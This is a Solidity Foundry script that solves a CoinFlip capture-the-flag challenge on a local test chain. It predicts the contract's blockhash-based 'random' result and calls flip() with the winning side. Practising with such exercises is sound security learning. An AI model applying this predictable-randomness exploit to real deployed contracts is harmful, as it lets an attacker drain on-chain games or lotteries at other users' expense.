// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Script, console} from "@forge-std/Script.sol";
import {CoinFlip} from "@main/3_CoinFlip.sol";

contract SolveCoinFlipScript is Script {

    // using SafeMath for uint256;

    CoinFlip coinflipChallenge = CoinFlip( address(0x8464135c8F25Da09e49BC8782676a84730C318bC) );
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() public {
        // uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        // string memory mnemonic = vm.envString("MNEMONIC");

        // address is already funded with ETH
        string memory mnemonic ="test test test test test test test test test test test junk";
        uint256 attackerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 2); //  address = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

        vm.startBroadcast(attackerPrivateKey);

        // make anvil-node
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;


        if (side) {
            coinflipChallenge.flip(true); 
        } else {
            coinflipChallenge.flip(false);
        }


        console.log("Consecutive Wins: ", coinflipChallenge.consecutiveWins());

        vm.stopBroadcast();
    }
}
